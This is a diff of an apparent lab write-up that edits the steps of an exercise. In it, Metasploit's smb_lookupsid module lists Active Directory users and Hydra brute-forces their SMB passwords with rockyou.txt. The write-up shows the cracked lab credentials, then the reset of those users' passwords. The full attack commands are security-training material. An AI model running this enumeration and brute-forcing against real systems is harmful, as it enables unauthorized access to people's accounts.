@@ -7,16 +7,15 @@
 
 <h2>Solution</h2>
 
-     Use Kali Linux to attempt an attack on Pretty Safe Electronic's Active Directory house on 171.16.30.55
+    Utilize Kali Linux to target Pretty Safe Electronic's Active Directory located at 171.16.30.55.
 
-    --We will be using Metasploit's Auxiliary smblookupsid to exploit the directory to enumerate authorized users.
-    --We will be using the output from Metasploit output in Hydra to target the specific users on the directory.
-    --We will use the common "rockyou.txt" wordlist to test against the users for weak passwords.
+    - Use Metasploit's Auxiliary module smblookupsid to enumerate authorized users in the directory.
+    - Utilize Hydra, leveraging Metasploit's output, to target specific users in the directory.
+    - Employ the "rockyou.txt" wordlist to identify weak passwords among users.
 
+    Reset passwords for identified users with weak passwords.
 
-    Force password reset on identified users with weak passwords.
-
-    --We will login to the domain controller and force password resets for users identified with weak passwords.
+    - Access the domain controller and initiate password resets for users flagged with weak passwords.
 
 <h2>Tools Used</h2>
 
@@ -35,46 +34,43 @@
 
 <h2>Actions Taken</h2>
 
-    Spin up the Security-Desk workstation and login to player one.
-    Open Terminal and run "sudo msfconsole"
-    Select the smb_lookupsid too by running "use auxiliary/scanner/smb_lookupsid"
-    Set target to Active Directory service by running "set RHOSTS 172.16.30.55"
-    Set SMB user by running "set SMBUser playerone"
-    Set SMB password by running "set SMBPass password123"
-    Start exploit by running "exploit"
-    Once task is complete, copy output and paste into MousePad.
-    
-    Remove all data except found users:
-    rcortes
-    jsmith
-    manderson
-    skeefe
-    nkeefe
-    asteele
-    jraffin
-    jcortes
-    tclark
-
-    Save document in home directory. (/home/playerone/(KNOWNUSERS).txt)
-    Create another empty document in the home directory for Hydra's output. (/home/playerone/(OUTPUT).txt
-    Quit metasploit console.
-    In Terminal, run "hydra -L /home/playerone/(KNOWNUSERS).txt -P /usr/share/wordlists/rockyou.txt -o /home/playerone/(OUTPUT).txt -v 172.16.30.55 smb" *Hydra discovered two users who had weak passwords:
-
-    nkeefe:987654321
-    jcortes:iloveme
-
-    Shut down Security-Desk
-    Spin up Domain-Controller
-    Select Start Menu > Administrative Tools
-    Open Active Directory Users and Computers
-    Select prettysafeelectronics.io > Users
-    We will adjust the password policy for Jan Cortes (jcortes) & Naomi O'Keefe (nkeefe)
-    Select the respective user from the list and open properties from secondary menu.
-    Select the account tab.
-    Uncheck [Password never expires]
-    Check [User must change password at next logon]
-    Apply changes
-    Repeat for second user.
+    1. Activate the Security-Desk workstation and log in to player one.
+    2. Launch Terminal and execute "sudo msfconsole".
+    3. Select the smb_lookupsid tool by running "use auxiliary/scanner/smb_lookupsid".
+    4. Set the target to Active Directory service with "set RHOSTS 172.16.30.55".
+    5. Specify SMB user with "set SMBUser playerone".
+    6. Set SMB password using "set SMBPass password123".
+    7. Commence exploit with "exploit".
+    8. After completion, copy and paste the output into MousePad.
+    9. Remove extraneous data, leaving only found users:
+        rcortes
+        jsmith
+        manderson
+        skeefe
+        nkeefe
+        asteele
+        jraffin
+        jcortes
+        tclark
+    10. Save the document in the home directory (/home/playerone/(KNOWNUSERS).txt).
+    11. Create an empty document for Hydra's output in the home directory (/home/playerone/(OUTPUT).txt).
+    12. Exit the Metasploit console.
+    13. In Terminal, execute "hydra -L /home/playerone/(KNOWNUSERS).txt -P /usr/share/wordlists/rockyou.txt -o /home/playerone/(OUTPUT).txt -v 172.16.30.55 smb". 
+        Hydra identifies two users with weak passwords:
+        nkeefe:987654321
+        jcortes:iloveme
+    14. Shutdown Security-Desk.
+    15. Initiate Domain-Controller.
+    16. Navigate to Start Menu > Administrative Tools.
+    17. Open Active Directory Users and Computers.
+    18. Access prettysafeelectronics.io > Users.
+    19. Adjust the password policy for Jan Cortes (jcortes) & Naomi O'Keefe (nkeefe):
+        - Select the respective user and open properties from the secondary menu.
+        - Navigate to the account tab.
+        - Uncheck [Password never expires].
+        - Check [User must change password at next logon].
+        - Apply changes.
+    20. Repeat for the second user.
 
 <h2>Report</h2>
 <br />
